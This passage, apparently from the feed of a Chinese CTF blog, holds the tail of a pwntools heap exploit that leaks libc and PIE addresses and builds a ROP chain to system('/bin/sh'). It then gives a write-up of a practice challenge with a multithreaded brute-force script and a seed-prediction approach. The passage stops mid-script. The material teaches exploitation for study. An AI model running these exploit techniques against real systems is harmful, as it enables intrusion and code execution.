&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay1=p64(sec^victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;,pay1,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ccc&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pie_base_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1794&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pie: &amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(pie_base_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i+&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3f8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Name: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lib_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;96&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x1f6c60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc: &amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(lib_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(p.bases)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc.so.6&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=lib_addr+libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#0x4c330&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=lib_addr+&lt;span class=&#34;number&#34;&gt;0x1b61b4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(bin_sh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=&lt;span class=&#34;number&#34;&gt;0x00000000000233d1&lt;/span&gt;+lib_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi=&lt;span class=&#34;number&#34;&gt;0x00023b65&lt;/span&gt;+lib_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop_chain=p64(ret)*&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;+p64(pop_rdi)+p64(bin_sh)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## edit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;,rop_chain)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;













</content>
        <category term="PWN入门" />
        <updated>2023-05-17T07:35:39.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/</id>
        <title>pwn入门-25-高级网络攻防练习题一道</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/"/>
        <content type="html">&lt;p&gt;题目链接: 本链接加上 .&amp;#x2F;pwn即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512223501172.png&#34; alt=&#34;image-20230512223501172&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;程序逻辑分析&#34;&gt;&lt;a href=&#34;#程序逻辑分析&#34; class=&#34;headerlink&#34; title=&#34;程序逻辑分析&#34;&gt;&lt;/a&gt;程序逻辑分析&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512213431688.png&#34; alt=&#34;image-20230512213431688&#34;&gt; &lt;/p&gt;
&lt;p&gt;​		该程序是根据时间戳为随机数的种子,然后随机malloc和free一些内存,即把堆的空间打乱,然后再去给flag分配内容空间,然后把控制权交给用户,让用户进行操作.&lt;/p&gt;
&lt;h2 id=&#34;解题思路&#34;&gt;&lt;a href=&#34;#解题思路&#34; class=&#34;headerlink&#34; title=&#34;解题思路&#34;&gt;&lt;/a&gt;解题思路&lt;/h2&gt;&lt;h3 id=&#34;思路一-枚举&#34;&gt;&lt;a href=&#34;#思路一-枚举&#34; class=&#34;headerlink&#34; title=&#34;思路一 枚举&#34;&gt;&lt;/a&gt;思路一 枚举&lt;/h3&gt;&lt;p&gt;​		不论是最开始的打乱堆空间还是分配flag的堆空间,堆块的大小都限定在了0x400以内,也就是tcache的范围. 换言之,堆块的大小有40种情况.&lt;/p&gt;
&lt;p&gt;​		flag分配的堆块必定在这40种情况之中,如果在flag分配的时候,正好分配到了tcache中的bin,那么如果知道tcache中的这个bin的空间中的前一个bin的大小,那么就可以去申请这个bin,然后进行show打印,就有可能打印出来flag. &lt;/p&gt;
&lt;p&gt;​		举例:&lt;/p&gt;
&lt;p&gt;​		先随机化分配了一些堆块&lt;/p&gt;
&lt;p&gt;​		0x100&lt;/p&gt;
&lt;p&gt;​		0x40&lt;/p&gt;
&lt;p&gt;​		0x30&lt;/p&gt;
&lt;p&gt;​		0x50&lt;/p&gt;
&lt;p&gt;​		0x40&lt;/p&gt;
&lt;p&gt;​		然后释放了一些堆块&lt;/p&gt;
&lt;p&gt;​		0x100&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;	0x40	&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		0x30&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;		0x50&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		0x40&lt;/p&gt;
&lt;p&gt;​		申请flag堆块&lt;/p&gt;
&lt;p&gt;​		0x100&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;		0x40&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		0x30&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;blue&#34;&gt;0x50 flag&lt;/font&gt; &lt;/p&gt;
&lt;p&gt;​		0x40&lt;/p&gt;
&lt;p&gt;​		此时,如果能够申请到0x40的空闲堆块,然后进行打印,就有可能会打印出来flag&lt;/p&gt;
&lt;p&gt;​		这种方法存在一定的约束条件:&lt;/p&gt;
&lt;p&gt;​		1.根据tcache的后进先出原则,flag前的空闲堆块需要是最后一个释放的空间,不然的话就要先申请它后面的tcache bin&lt;/p&gt;
&lt;p&gt;​		2.flag的堆块与前面一个空闲堆块的距离要小于show能打印的范围&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​		不过随着尝试的次数增多,总会有满足这两个约束条件的情况,利用多线程,申请0x10,0x20,0x30….0x400大小的堆块,可以满足所有的情况,那么唯一不确定的就是是否符合约束条件,但通过该种尝试,也大大提高了枚举的成功率&lt;/p&gt;
&lt;h4 id=&#34;exp攻击脚本&#34;&gt;&lt;a href=&#34;#exp攻击脚本&#34; class=&#34;headerlink&#34; title=&#34;exp攻击脚本&#34;&gt;&lt;/a&gt;exp攻击脚本&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;brute_force&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;, xxxxx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Data: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    recv = p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;quot;flag&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; recv:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(recv)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            recv = p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threads = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x410&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = threading.Thread(target=brute_force, args=(i,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        threads.append(t)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; t &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; threads:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.join()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;把输出 重定向到1.txt 一次不一定能成功,一般几次就可以了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512214621634.png&#34; alt=&#34;image-20230512214621634&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;思路二&#34;&gt;&lt;a href=&#34;#思路二&#34; class=&#34;headerlink&#34; title=&#34;思路二&#34;&gt;&lt;/a&gt;思路二&lt;/h3&gt;&lt;h4 id=&#34;漏洞点分析&#34;&gt;&lt;a href=&#34;#漏洞点分析&#34; class=&#34;headerlink&#34; title=&#34;漏洞点分析&#34;&gt;&lt;/a&gt;漏洞点分析&lt;/h4&gt;&lt;p&gt;​		随机数种子设置代码:v3 &amp;#x3D; time(0LL);		&lt;/p&gt;
&lt;p&gt;​		对随机数的种子的设置是精确到了s,所以它事实上是可以进行预测的.如果随机值是确定的,那么就可以确定后面分配了哪些堆块,释放了哪些堆块,flag申请到了哪个堆块,flag前面的空闲堆块是哪一个,都可以进行确定&lt;/p&gt;
&lt;p&gt;​		如何就可以获取flag堆块前面的第一个空闲堆块的大小,也可以获取它是第几个.&lt;/p&gt;
&lt;p&gt;​		然后就可以根据时间戳获取确定的解了,就可以算出即将到来的时间对应的解.在时间到来时发送payload即可.&lt;/p&gt;
&lt;h4 id=&#34;根据时间戳获取flag堆块前一个空闲堆块脚本&#34;&gt;&lt;a href=&#34;#根据时间戳获取flag堆块前一个空闲堆块脚本&#34; class=&#34;headerlink&#34; title=&#34;根据时间戳获取flag堆块前一个空闲堆块脚本&#34;&gt;&lt;/a&gt;根据时间戳获取flag堆块前一个空闲堆块脚本&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span 